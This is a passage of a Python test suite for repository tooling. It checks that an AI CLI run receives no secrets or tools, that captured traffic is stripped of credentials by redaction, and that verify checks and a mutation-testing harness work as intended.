                "total_cost_usd": 0.1, "usage": {"input_tokens": 1, "output_tokens": 2},
                "modelUsage": {"m": {"inputTokens": 1, "note": self.PROSE["in_usage"], "fallback": None, "tier": "standard"}},
                "stop_reason": self.PROSE["in_code"], "result": self.PROSE["result"],
                "a_new_field": self.PROSE["added"], "stats": {"note": self.PROSE["nested"]},
                "permission_denials": [{"tool_name": "Bash", "tool_input": {"command": self.PROSE["denied"]}}]}
        if output is not None:
            said["structured_output"] = output
        said.update(extra)
        return said

    def stand_in(self, version=None, status=None, status_exit=0, answer=None, answer_exit=0) -> pathlib.Path:
        """A directory holding the stand-in `claude` and what it answers; it records the environment and arguments it is
        given beside itself."""
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "version").write_text("%s (Claude Code)\n" % (version or self.PIN))
        (folder / "version.exit").write_text("0\n")
        (folder / "status").write_text(json.dumps({"loggedIn": True, "authMethod": "claude.ai"} if status is None else status))
        (folder / "status.exit").write_text("%d\n" % status_exit)
        (folder / "answer").write_text(json.dumps(self.answer(self.VALID) if answer is None else answer))
        (folder / "answer.exit").write_text("%d\n" % answer_exit)
        cli = folder / "claude"
        cli.write_text(self.STAND_IN)
        cli.chmod(0o755)
        return folder

    def run_script(self, out, cfg, cli, home=None) -> subprocess.CompletedProcess:
        """The script as the Maintainer runs it, from a shell that holds a key the CLI must never see."""
        env = {"PATH": os.environ["PATH"], "HOME": str(home or self.home), "LANG": "C",
               "ANTHROPIC_API_KEY": "sk-" + "ant-" + "api03-NEVER-SEEN", "GH_TOKEN": "gh" + "p_NEVER-SEEN"}
        return subprocess.run(["bash", str(self.SCRIPT), str(out), str(cfg), str(cli)], cwd=SCRATCH.name,
                              capture_output=True, text=True, env=env, timeout=120)

    def setUp(self):
        self.home = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        self.cfg = self.home.parent / (self.home.name + "-cfg")
        self.cfg.mkdir()
        self.out = self.home.parent / (self.home.name + "-out")

    def texts(self, out) -> dict:
        return {p.name: p.read_text() for p in pathlib.Path(out).iterdir()}

    def test_the_cli_is_given_only_the_named_environment_and_no_tool(self):
        folder = self.stand_in()
        ran = self.run_script(self.out, self.cfg, folder / "claude")
        self.assertEqual(ran.returncode, 0, ran.stderr)
        named = {"HOME", "USER", "LOGNAME", "SHELL", "PATH", "TMPDIR", "LANG", "CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER"}
        shell_adds = {"PWD", "OLDPWD", "SHLVL", "_"}
        for call in ("version", "auth", "task"):
            given = dict(line.split("=", 1) for line in (folder / ("env-" + call)).read_text().splitlines() if "=" in line)
            self.assertEqual(set(given) - shell_adds, named, call)
            self.assertEqual((given["CLAUDE_CONFIG_DIR"], given["DISABLE_AUTOUPDATER"]), (str(self.cfg), "1"), call)
            self.assertNotIn("NEVER-SEEN", (folder / ("env-" + call)).read_text(), call)
        args = (folder / "args").read_text().split("\n")
        self.assertEqual(args[args.index("--tools") + 1], "", "the model is given no tool")
        self.assertIn("--json-schema", args)
        self.assertNotIn("NEVER-SEEN", "".join(self.texts(self.out).values()))

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder = self.stand_in()
        cli = folder / "claude"
        existing = self.home.parent / (self.home.name + "-taken")
        existing.mkdir()
        under_home = self.home / "sub"
        under_home.mkdir()
        dot_claude = self.home / ".claude" / "deep"
        dot_claude.mkdir(parents=True)
        linked = self.home.parent / (self.home.name + "-link")
        linked.symlink_to(self.home / ".claude")
        try:                                      # on a file system that tells case, a directory of its own
            (self.home / ".CLAUDE").mkdir()
        except FileExistsError:                   # on one that does not, the Maintainer's own, under another name
            pass
        cases = [("OUT exists", existing, self.cfg, None, "exists; name a new directory"),
                 ("OUT inside the repo", ROOT / "never-made", self.cfg, None, "OUT is inside the repo"),
                 ("OUT inside CONFIG_DIR", self.cfg / "out", self.cfg, None, "OUT is inside CONFIG_DIR"),
                 ("CONFIG_DIR inside the repo", self.out, ROOT / "tools", None, "CONFIG_DIR is inside the repo"),
                 ("CONFIG_DIR is HOME", self.out, self.home, None, "the home directory or holds it"),
                 ("CONFIG_DIR holds HOME", self.out, self.home.parent, under_home, "the home directory or holds it"),
                 ("CONFIG_DIR is /", self.out, pathlib.Path("/"), None, "the home directory or holds it"),
                 ("CONFIG_DIR is ~/.claude", self.out, self.home / ".claude", None, "under ~/.claude"),
                 ("CONFIG_DIR under ~/.claude", self.out, dot_claude, None, "under ~/.claude"),
                 ("CONFIG_DIR linked to ~/.claude", self.out, linked, None, "under ~/.claude"),
                 ("CONFIG_DIR is ~/.CLAUDE", self.out, self.home / ".CLAUDE", None, "under ~/.claude"),
                 ("CONFIG_DIR missing", self.out, self.home / "none", None, "CONFIG_DIR is not a directory")]
        for name, out, cfg, home, said in cases:
            ran = self.run_script(out, cfg, cli, home=home)
            self.assertEqual(ran.returncode, 2, name)
            self.assertIn(said, ran.stderr, name)
            self.assertFalse(out.exists() and out != existing, name)
            self.assertFalse((folder / "env-version").exists(), name + ": nothing was asked")
        # The wrong version, a login that says no, and one the script cannot read: each after asking, before the Task.
        for name, folder, code, said in [
                ("wrong version", self.stand_in(version="0.0.1"), 1, "is version '0.0.1', exit 0, not " + self.PIN),
                ("not logged in", self.stand_in(status={"loggedIn": False}), 1, "login under CONFIG_DIR is 'no', exit 0"),
                ("unknown status", self.stand_in(status={"something": "else"}), 1, "is 'unknown', exit 0"),
                ("status not json", self.stand_in(status="not json"), 1, "is 'unknown', exit 0"),
                ("auth status failed", self.stand_in(status_exit=3), 1, "is 'yes', exit 3, not yes")]:
            out = self.home.parent / (self.home.name + "-" + name.replace(" ", "-"))
            ran = self.run_script(out, self.cfg, folder / "claude")
            self.assertEqual(ran.returncode, code, name)
            self.assertIn(said, ran.stderr, name)
            self.assertFalse((folder / "args").exists(), name + ": the Task was not asked")
            self.assertNotIn("NEVER-SEEN", "".join(self.texts(out).values()), name)

    def test_the_logins_exit_code_is_recorded(self):
        folder = self.stand_in()
        self.assertEqual(self.run_script(self.out, self.cfg, folder / "claude").returncode, 0)
        checked = json.loads((self.out / "checked.json").read_text())
        self.assertEqual(checked["login"], {"exit": 0, "status": "yes"})
        self.assertTrue(checked["every_part_holds"])
        folder = self.stand_in(status_exit=3)
        out = self.home.parent / (self.home.name + "-failed-login")
        self.assertEqual(self.run_script(out, self.cfg, folder / "claude").returncode, 1)
        checked = json.loads((out / "checked.json").read_text())
        self.assertEqual((checked["login"], checked["every_part_holds"]), ({"exit": 3, "status": "yes"}, False))

    def test_no_model_text_reaches_out_whether_or_not_the_output_validates(self):
        invalid = dict(self.VALID, prose=self.PROSE["invalid"])
        in_result = dict(self.answer(), result=json.dumps(self.VALID))
        del in_result["permission_denials"]
        for name, answer, code, validates, source in [("validates", self.answer(self.VALID), 0, True, "structured_output"),
                                                      ("does not validate", self.answer(invalid), 1, False, "structured_output"),
                                                      ("in result alone", in_result, 0, True, "result"),
                                                      ("no output", self.answer(), 1, False, None),
                                                      ("not json", "the model said THIS-PROSE-1 and nothing else", 1, False, None)]:
            folder = self.stand_in(answer=answer)
            out = self.home.parent / (self.home.name + "-" + name.replace(" ", "-"))
            ran = self.run_script(out, self.cfg, folder / "claude")
            self.assertEqual(ran.returncode, code, (name, ran.stderr))
            texts = self.texts(out)
            for word in self.PROSE.values():
                self.assertNotIn(word, "".join(texts.values()) + ran.stdout + ran.stderr, name)
            checked = json.loads(texts["checked.json"])
            self.assertEqual((checked["structured_output"]["validates"], checked["structured_output"]["from"]),
                             (validates, source), name)
            if isinstance(answer, dict):
                kept = json.loads(texts["clean-3"])
                allowed = set(re.search(r'^KEPT_RESULT="([^"]*)"$', self.SCRIPT.read_text(), re.M).group(1).split())
                self.assertTrue(set(kept) <= allowed, (name, set(kept) - allowed))
                self.assertNotIn("a_new_field", kept, name)
                self.assertEqual(kept["modelUsage"], {"m": {"inputTokens": 1, "fallback": None, "tier": "standard"}}, name)
                self.assertEqual([t for t in checked["model_text_removed"] if t["field"] in ("$.modelUsage.m.note", "$.stop_reason")],
                                 [{"field": "$.modelUsage.m.note", "characters": len(self.PROSE["in_usage"])},
                                  {"field": "$.stop_reason", "characters": len(self.PROSE["in_code"])}], name)
                self.assertEqual(kept["usage"], {"input_tokens": 1, "output_tokens": 2}, name)
                self.assertNotIn("stop_reason", kept, name)
                self.assertEqual(kept.get("permission_denials"), [{"tool_name": "Bash"}] if "permission_denials" in answer else None, name)
                self.assertEqual("structured_output" in kept, validates, name)
                self.assertTrue(any(t["field"].startswith("every field KEPT_RESULT") for t in checked["model_text_removed"]), name)
        asked = json.loads((out / "requests.json").read_text())
        self.assertEqual(asked[2]["kept"], sorted(allowed, key=asked[2]["kept"].index))
        self.assertIn('--tools ""', asked[2]["call"])
        self.assertEqual(asked[2]["env"]["CLAUDE_CONFIG_DIR"],
                         "a configuration directory of its own, logged in to the Maintainer's own subscription (decision 0033)")


class Redaction(unittest.TestCase):
    """`tools/redact_trial.py` runs on the raw capture, outside the repo, before anyone reads it."""

    def redact(self, raw: str) -> tuple:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (folder / "raw").write_text(raw)
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(redact_trial.main([str(folder / "raw"), str(folder / "out")]), 0)
        return (folder / "out").read_text(), said.getvalue()

    def test_a_drafted_fixture_comes_out_with_no_credential(self):
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "tok" + "en " + SHAPED["ghs"]
        data["exchanges"][0]["request"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][0]["response"]["body"]["token"] = SHAPED["runner registration"]
        data["exchanges"][0]["response"]["body"]["expires_at"] = "2026-10-15T15:02:11Z"
        data["exchanges"][0]["response"]["body"]["clone"] = SHAPED["token in a url"]
        data["exchanges"][0]["response"]["body"]["blob"] = SHAPED["base64 of a runner's credentials"]
        data["exchanges"][0]["response"]["body"]["notes"] = [SHAPED[name] for name in sorted(SHAPED)]
        out, said = self.redact(json.dumps(data))
        kept = json.loads(out)
        self.assertEqual(check_trials._credentials(kept, ""), [])
        self.assertEqual(check_trials._headers(kept), [])
        self.assertEqual(validate(kept, json.loads((ROOT / "schemas" / "trial.schema.json").read_text())), [])
        body = kept["exchanges"][0]["response"]["body"]
        self.assertEqual((body["expires_at"], body["external_id"]), ("2026-10-15T15:02:11Z", "factory-run-r1"))
        self.assertNotIn("token", body)
        self.assertNotIn("clone", body)
        self.assertEqual(body["notes"], [])
        self.assertIn("exchanges[0].request.headers.Authorization", kept["removed"])
        self.assertIn("exchanges[0].response.body.token", kept["removed"])
        self.assertIn("exchanges[0].response.body.clone", kept["removed"])
        for value in SHAPED.values():
            self.assertNotIn(value, out + said)

    def test_a_raw_capture_comes_out_with_no_credential(self):
        raw = ("HTTP/2.0 201 Created\nAuthorization: tok" + "en " + SHAPED["ghp"] + "\nX-Ratelimit-Remaining: 4999\nX-GitHub-SSO: required\n"
               "Set-" + "Cookie: user_session=abcdef\nLocation: " + SHAPED["signed url"] + "\n\n"
               + json.dumps({"tok" + "en": SHAPED["runner registration"], "expires_at": "2026-10-15T15:02:11Z"}) + "\n")
        out, said = self.redact(raw)
        self.assertIn("X-Ratelimit-Remaining: 4999", out)
        self.assertIn("expires_at", out)
        self.assertNotIn("Cookie", out)
        self.assertNotIn("X-GitHub-SSO", out)
        for value in (SHAPED["ghp"], SHAPED["runner registration"], "user_session", "sig=AbCdEf"):
            self.assertNotIn(value, out + said)
        self.assertIn("Authorization", said)

    def test_text_that_is_not_a_capture_is_still_redacted(self):
        out, said = self.redact("kept line\none line, " + SHAPED["jwt"] + " and done\n")
        self.assertEqual((out, said.splitlines()[0]), ("kept line\n", "removed: line 2"))


# One planted fault for each check, run from its front door. A check gutted to return nothing fails here.
FAILS = {
    "check_examples": lambda: check_examples.run(clone({"examples/decision.json": "{}"})),
    "check_lifecycle": lambda: check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(
        dict(check_lifecycle.load("issue"), terminal=[]))})),
    "check_apps": lambda: check_apps.run(clone({"config/apps.json": (ROOT / "config" / "apps.json").read_text()
                                                .replace('"level": "read"', '"level": "write"')})),
    "check_authority": lambda: check_authority.run(dict(json.loads((ROOT / "config" / "authority.json").read_text()),
                                                         author_role="pr-review")),
    "check_purity": lambda: check_purity.run(clone({"kernel/clock.py": "import time\n"})),
    "check_repo": lambda: check_repo.run(clone({"requirements.txt": "requests\n"})),
    "check_workflows": lambda: check_workflows.run(clone({".github/workflows/verify.yml": GOOD.replace("minutes: 15", "minutes: 45")})),
    "check_context": lambda: check_context.run(clone({"docs/lessons.md": "# Lessons\n"})),
    "check_trials": lambda: check_trials.run(clone({"trials/notes.txt": "x\n"})),
    "check_decisions": lambda: check_decisions.run(edited(history(), {FIRST: RECORD.replace("one thing.", "x.")})),
}


class Verify(unittest.TestCase):
    def test_every_check_is_run_by_verify(self):
        on_disk = {p.stem for p in (ROOT / "tools").glob("check_*.py")}
        run = {check.__module__.split(".")[-1] for _, check in verify.CHECKS}
        self.assertEqual(on_disk, run)

    def test_every_check_has_a_test_in_which_it_fails(self):
        self.assertEqual(set(FAILS), {p.stem for p in (ROOT / "tools").glob("check_*.py")})
        for name, planted in sorted(FAILS.items()):
            self.assertTrue(planted(), "%s finds nothing wrong with a planted fault" % name)
        # In CI this repo is a checkout, and compared with main; the copy `mutants.py` runs this in is an export.
        with outside_actions():
            for name, check in verify.CHECKS:
                self.assertEqual(check(), [], "%s finds fault with this repo" % name)

    def test_another_working_tree_inside_this_one_is_not_read(self):
        # A session's git worktree sits in the main checkout, a whole copy of the repo with a .git
        # file. A full clone has a .git directory. Neither is this repo, and nothing in it is checked.
        stray = {"AGENTS.md": "# other\n\n| Rule | Held by |\n|---|---|\n| x | `tools/gone.py` |\n",
                 "CLAUDE.md": "Be careful.\n", "requirements.txt": "requests\n",
                 "tests/test_x.py": "def test_x():\n    pass\n", "tests/deep/test_y.py": "",
                 "kernel/clock.py": "import time\n", "notes.txt": "github_pat_" + "x" * 40 + "\n"}
        planted = {"wt/.git": "gitdir: /elsewhere\n", "wt/notes.txt": "A folder with no AGENTS.md.\n"}
        for where, git in ((".claude/worktrees/other", ".git"), (".claude/worktrees/clone", ".git/HEAD"),
                           ("kernel/wt", ".git"), ("docs/wt", ".git")):
            planted["%s/%s" % (where, git)] = "gitdir: /elsewhere\n"
            planted.update({"%s/%s" % (where, rel): text for rel, text in stray.items()})
        root = clone(planted)
        walking = [(name, check) for name, check in verify.CHECKS
                   if "root" in check.__code__.co_varnames[:check.__code__.co_argcount]]
        self.assertGreaterEqual(len(walking), 5)
        for name, check in walking:
            with self.subTest(check=name), outside_actions():      # the copy is an export, with no .git
                self.assertEqual(check(root), [], "%s reads another working tree as this one" % name)

    def test_a_copy_of_the_repo_leaves_out_another_working_tree(self):
        root = tree({"a/x.py": "", "a/__pycache__/x.pyc": "", "corpus/d.jsonl": "", ".git/HEAD": "",
                     "wt/.git": "gitdir: /elsewhere\n", "wt/y.py": "", "a/clone/.git/HEAD": "", "a/clone/z.py": "",
                     "a/corpus/y.py": ""})
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/y.py", "a/x.py"])
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertEqual([p.name for p in to.iterdir()], ["a"])
        self.assertEqual(sorted(p.name for p in (to / "a").iterdir()), ["corpus", "x.py"])

    def test_only_the_corpus_at_the_root_is_skipped_and_only_a_directory(self):
        # make_corpus.py writes corpus/ at the root, and nowhere else. A folder of that name below
        # the root is code like any other, and a file named for a skipped folder is a file.
        token = "github_pat_" + "x" * 40 + "\n"
        root = clone({"kernel/corpus/x.py": "import time\n", "sim/corpus/test_hidden.py": "",
                      "sim/corpus/notes.txt": token, "corpus": token, "sim/__pycache__": token})
        self.assertTrue(caught(check_purity.run(root), "corpus/x.py:1 imports time"))
        problems = check_repo.run(root)
        for words in ("sim/corpus/test_hidden.py: a test outside tests/", "sim/corpus/notes.txt: holds something",
                      "corpus: holds something", "sim/__pycache__: holds something"):
            self.assertTrue(caught(problems, words), words)


    def test_local_output_is_skipped_only_while_git_does_not_hold_it(self):
        # CI checks out the commit afresh, with git's index beside it. Whatever is under __pycache__/
        # or the root's corpus/ there is either in the index, and committed, or written by this run.
        files = {"kernel/x.py": "", "kernel/__pycache__/x.cpython-39.pyc": "", "corpus/d.jsonl": "",
                 "sim/__pycache__/y.cpython-39.pyc": "", "corpus/local.jsonl": "", "a/corpus/z.py": ""}
        held = {"kernel/x.py": FILE, "kernel/__pycache__/x.cpython-39.pyc": FILE, "corpus/d.jsonl": FILE,
                "a/corpus/z.py": FILE}
        listed = ["a/corpus/z.py", "corpus/d.jsonl", "kernel/__pycache__/x.cpython-39.pyc", "kernel/x.py"]
        for version in (2, 3, 4):
            with self.subTest(version=version):
                root = commit(tree(files), held, version)
                self.assertEqual(walk.index(root), held)
                self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], listed)
                to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
                walk.copy(root, to)
                self.assertEqual([(to / rel).exists() for rel in files], [True, True, True, False, False, True])
        # A worktree's .git is a file that names its index's directory, which may be anywhere.
        gitdir = commit(pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)), held) / ".git"
        root = tree(dict(files, **{".git": "gitdir: %s\n" % gitdir}))
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], listed)
        # With nothing committed yet, or no .git at all, nothing can be committed; all of it is local.
        for root in (commit(tree(files), {}), tree(files)):
            self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/z.py", "kernel/x.py"])
        # Local output in any case is local output: a file system may fold case, and Python's caches with it.
        local = {"kernel/x.py": "", "sim/__PYCACHE__/y.pyc": "", "Corpus/local.jsonl": ""}
        for root in (commit(tree(local), {"kernel/x.py": FILE}), tree(local)):
            self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["kernel/x.py"])

    def test_an_index_git_writes_is_read_as_git_reads_it(self):
        # Each way git may write it: SHA-1 or SHA-256 object ids; version 3, which an entry only added
        # with -N needs, or 4; and the checksum at its end, or zeros there under index.skipHash.
        files = {"a.py": "", "kernel/x.py": "", "kernel/__pycache__/x.cpython-39.pyc": "", "é.md": "",
                 "z/" + "deep/" * 30 + "f.py": "", "later.py": ""}
        for objects, size in (("sha1", 20), ("sha256", 32)):
            for config in ((), ("index.version=4",), ("index.skipHash=true",), ("index.skipHash=true", "index.version=4")):
                with self.subTest(objects=objects, config=config):
                    root = tree(files)
                    git(root, "init", "-q", "--object-format=" + objects)
                    for setting in config:
                        git(root, "config", *setting.split("=", 1))
                    git(root, "add", "-f", "--", *sorted(set(files) - {"later.py"}))
                    git(root, "add", "-N", "later.py")
                    git(root, "update-index", "--add", "--cacheinfo", "160000,%s,kernel/lib" % ("1" * size * 2))
                    data = (root / ".git" / "index").read_bytes()
                    self.assertEqual(not any(data[-size:]), "index.skipHash=true" in config)
                    self.assertEqual(walk.index(root), held_by_git(root))
                    self.assertEqual(walk.index(root)["kernel/lib"], GITLINK)
        # A worktree's gitdir keeps no config; the repo's, with its object format, is in its common dir.
        main = staged({"a.py": ""}, "index.skipHash=true", objects="sha256")
        gitdir = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (gitdir / "index").write_bytes((main / ".git" / "index").read_bytes())
        (gitdir / "commondir").write_text(str(main / ".git") + "\n")
        root = tree({"a.py": "", ".git": "gitdir: %s\n" % gitdir})
        self.assertEqual(walk.index(root), {"a.py": FILE})

    def test_the_index_is_read_as_git_wrote_it(self):
        held = walk.index(ROOT)
        if held is None:        # an export, with no .git to read
            self.assertFalse(os.path.lexists(str(ROOT / ".git")))
            return
        self.assertEqual((held["AGENTS.md"], held["tools/walk.py"]), (FILE, FILE))
        self.assertFalse([p for p in held if "__pycache__" in p or p.startswith("corpus/")])

    def test_a_link_is_not_followed_and_a_link_to_nothing_is_reported(self):
        root = tree({"a/x.py": ""})
        (root / "l").symlink_to("a", target_is_directory=True)
        (root / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/x.py"])
        self.assertTrue(caught(check_repo.run(root), "gone.py: a link to nothing"))
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertTrue((to / "l").is_symlink() and (to / "gone.py").is_symlink())

    def test_only_the_walk_walks_the_tree(self):
        # One walk, so that every check and every copy skips the same things.
        found = sorted(p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)
                       if p.suffix == ".py" and p.relative_to(ROOT).parts[0] in ("tools", "tests", "sim")
                       and walkers(p.read_text()))
        self.assertEqual(found, ["tools/walk.py"])

    def test_a_walk_written_another_way_is_still_a_walk(self):
        for source in ("os.walk(root)\n", "os.walk (root)\n", "os.fwalk(root)\n", "root.walk()\n",
                       "root.rglob('*.py')\n", "os.scandir(root)\n", "shutil.copytree(a, b)\n",
                       "from os import walk\n", "from shutil import copytree as ct\nct(a, b)\n",
                       "ct = shutil.copytree\n", "glob.glob('x', recursive=True)\n", "glob.iglob('**/*.py')\n",
                       "root.glob('x/**/*.py')\n"):
            self.assertTrue(walkers(source), source)
        self.assertEqual(walkers("from tools import walk\nwalk.files(root)\nroot.glob('*.py')\n"
                                 "glob.glob('x', recursive=False)\nast.walk(tree)\n"), [])

    def test_a_check_that_finds_a_problem_fails_verify(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertTrue(verify.failed([("always", lambda: ["a problem"])]))
            self.assertFalse(verify.failed([("never", lambda: [])]))
        self.assertIn("a problem", said.getvalue())

    def test_make_fast_is_verify_without_the_seeded_simulation(self):
        """The required check runs every test file at any depth; only `make fast` leaves the slow ones out."""
        everything = {".".join(p.relative_to(ROOT).with_suffix("").parts) for p in walk.files(ROOT, "tests")
                      if p.name.startswith("test_") and p.suffix == ".py"}
        slow = {"tests." + name for name in verify.SLOW}
        self.assertTrue(slow <= everything, "a slow test named in verify.SLOW does not exist")
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["modules"] = modules_in(suite)
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()):     # main prints the unverified rules
                self.assertEqual(verify.main([]), 0)
                self.assertEqual(ran["modules"], everything)
                verify.main(["--fast"])
                self.assertEqual(ran["modules"], everything - slow)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        makefile = (ROOT / "Makefile").read_text()
        self.assertIn("\nverify:\n\t$(PY) -m tools.verify\n", makefile)
        self.assertIn("\nfast:\n\t$(PY) -m tools.verify --fast\n", makefile)

    def test_every_test_file_is_discovered(self):
        found = set()

        def names(suite):
            for item in suite:
                if isinstance(item, unittest.TestSuite):
                    names(item)
                else:
                    found.add(type(item).__module__.split(".")[-1])

        names(unittest.defaultTestLoader.discover(str(ROOT / "tests"), top_level_dir=str(ROOT)))
        self.assertEqual(found, {p.stem for p in (ROOT / "tests").glob("test_*.py")})

    def test_every_link_is_listed_and_none_is_followed(self):
        # A link is never another working tree to skip, even when what it points at holds a .git.
        root = tree({"a/x.py": "", "other/.git": "gitdir: /elsewhere\n", "other/y.py": ""})
        (root / "a" / "l").symlink_to("..", target_is_directory=True)
        (root / "a" / "wt").symlink_to("../other", target_is_directory=True)
        (root / "a" / "f.py").symlink_to("x.py")
        (root / "a" / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.links(root)],
                         ["a/f.py", "a/gone.py", "a/l", "a/wt"])
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/f.py", "a/x.py"])


AGAIN = "; fix the copy or run named here, then run python3 -m tools.mutants again"
FAILS_A_TEST = ("F\n%s\nFAIL: test_x (tests.test_x.T)\n%s\nAssertionError\n\nRan 1 test\n\nFAILED (failures=1)\n"
                % ("=" * 70, "-" * 70))


MEND = "; mark or mend that test, then run python3 -m tools.mutants again"
PASSES = (0, 0, "OK\n")


def told(behaviour: dict, calls: list):
    """A stand-in for `mutants.suite`, which answers by the word the mutant wrote into k.py.

    A test run alone is answered by the word with " alone" after it, if `behaviour` has it, and by the word if not. A
    list of answers gives one to each run in turn, the last given again to the runs after it.
    """
    def run(work, first=(), only=None):
        said = (work / "k.py").read_text().strip() + (" alone" if only else "")
        calls.append(said)
        answers = behaviour.get(said, behaviour.get(said.replace(" alone", "")))
        if isinstance(answers, list):
            wait, status, output = answers[min(calls.count(said), len(answers)) - 1]
        else:
            wait, status, output = answers
        time.sleep(wait)
        if isinstance(output, Exception):
            raise output
        calls.append("done " + said)
        return status, output
    return run


def mutate(*names) -> list:
    return [(name, "k.py", "rule\n", name + "\n") for name in names]


def suite_of(test: str, files: dict = None) -> pathlib.Path:
    """A throwaway repo whose tests are one module holding `test`, a method of a TestCase, beside any other `files`."""
    return tree(dict(files or {}, **{"tests/__init__.py": "", "tests/test_x.py": "import os\nimport time\nimport "
                                     "unittest\n\n\nclass T(unittest.TestCase):\n" + test}))


class Mutants(unittest.TestCase):
    """The mutation check runs its mutants side by side, and only a failing test kills one."""

    def check(self, behaviour: dict, names: list, extra: list = ()):
        calls = []
        behaviour = dict(behaviour, rule=(0, 0, "OK\n"))
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate(*names) + list(extra), tree({"k.py": "rule\n"}), told(behaviour, calls), 3)
        return code, said.getvalue().splitlines(), calls

    @support.wall_clock
    def test_mutants_are_reported_in_their_order_however_their_runs_finish(self):
        code, lines, calls = self.check({"slow": (0.5, 1, FAILS_A_TEST), "quick": (0, 1, FAILS_A_TEST),
                                         "quicker": (0, 1, FAILS_A_TEST)}, ["slow", "quick", "quicker"])
        self.assertEqual(calls[:2], ["rule", "done rule"], "the run of the unbroken tests is first, and alone")
        self.assertLess(calls.index("done quicker"), calls.index("done slow"), "the runs did not overlap")
        self.assertEqual(lines, ["killed    slow", "killed    quick", "killed    quicker", "3 of 3 mutants killed"])
        self.assertEqual(code, 0)

    @support.wall_clock
    def test_a_run_that_hangs_is_ended_reported_and_fails_the_check(self):
        began = time.monotonic()
        self.assertIsNone(mutants.suite(suite_of("    def test_x(self):\n        time.sleep(60)\n"), 1)[0])
        self.assertLess(time.monotonic() - began, 30)
        code, lines, _ = self.check({"hangs": (0, None, "")}, ["hangs"])
        self.assertEqual(lines, ["ERROR     hangs (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN),
                                 "0 of 1 mutants killed"])
        self.assertEqual(code, 1)

    def test_only_a_failing_test_kills_a_mutant(self):
        cases = {
            "a test fails": ("    def test_x(self):\n        self.assertEqual(1, 2)\n", "killed"),
            "a test raises": ("    def test_x(self):\n        {}['gone']\n", "killed"),
            "every test passes": ("    def test_x(self):\n        pass\n", "SURVIVED"),
            "the runner dies": ("    def test_x(self):\n        os._exit(1)\n", "ERROR"),
            "a module will not import": ("    pass\n\n\nimport a_module_the_copy_left_out\n", "ERROR"),
        }
        for name, (test, outcome) in cases.items():
            said, why = mutants.verdict(*mutants.suite(suite_of(test)))
            self.assertEqual(said, outcome, name)
            self.assertTrue(said != "ERROR" or why.endswith(AGAIN), name)
        crash = "Traceback (most recent call last):\nMemoryError\n"
        self.assertEqual(mutants.verdict(1, crash), ("ERROR", "exit status 1 and no test failed, ending 'MemoryError'" + AGAIN))
        self.assertEqual(mutants.verdict(2, FAILS_A_TEST)[0], "ERROR")
        code, lines, _ = self.check({"crashes": (0, 1, crash)}, ["crashes"])
        self.assertEqual(lines[0], "ERROR     crashes (exit status 1 and no test failed, ending 'MemoryError'%s)" % AGAIN)
        self.assertEqual(code, 1)

    def test_each_run_stops_at_its_first_failure(self):
        status, output = mutants.suite(suite_of("    def test_a(self):\n        self.fail()\n\n"
                                                "    def test_b(self):\n        self.fail()\n"))
        self.assertEqual((status, output.count("FAIL: ")), (1, 1))

    def test_the_tests_a_mutant_names_run_first_and_the_whole_suite_after_them(self):
        where = suite_of("    def test_a(self):\n        pass\n\n    def test_b(self):\n        self.fail()\n")
        status, output = mutants.suite(where, first=("tests.test_x.T.test_b",))
        self.assertEqual((status, output.count("FAIL: ")), (1, 1))
        self.assertIn("Ran 1 test", output, "only the test named ran")
        status, output = mutants.suite(where, first=("tests.test_x.T.test_a",))
        self.assertEqual((status, output.count("FAIL: test_b")), (1, 1), "the whole suite ran after the named test passed")
        said = mutants.verdict(*mutants.suite(where, first=("tests.test_x.T.test_gone",)))
        self.assertEqual(said[0], "ERROR", "a test named that is not there kills nothing")
        status, output = mutants.suite(where, only="tests.test_x.T.test_a")
        self.assertEqual((status, output.count("Ran 1 test")), (0, 1), "the test named alone ran alone, and passed")
        calls = []

        def run(work, **given):
            calls.append(given)
            return (0, "OK\n") if (work / "k.py").read_text() == "rule\n" else (1, FAILS_A_TEST)
        for mutant in (("named", "k.py", "rule\n", "x\n", ("tests.test_x.T.test_b",)), ("plain", "k.py", "rule\n", "x\n")):
            self.assertEqual(mutants.attempt(mutant, tree({"k.py": "rule\n"}), run)[0], "killed")
        alone = {"only": "tests.test_x.T.test_x"}
        self.assertEqual(calls, [{"first": ("tests.test_x.T.test_b",)}, alone, alone, {}, alone, alone],
                         "the test that failed ran alone on the mutant and on the unbroken code")

    def test_the_summary_counts_only_the_mutants_killed(self):
        stale = [("gone", "k.py", "not there\n", "x\n")]
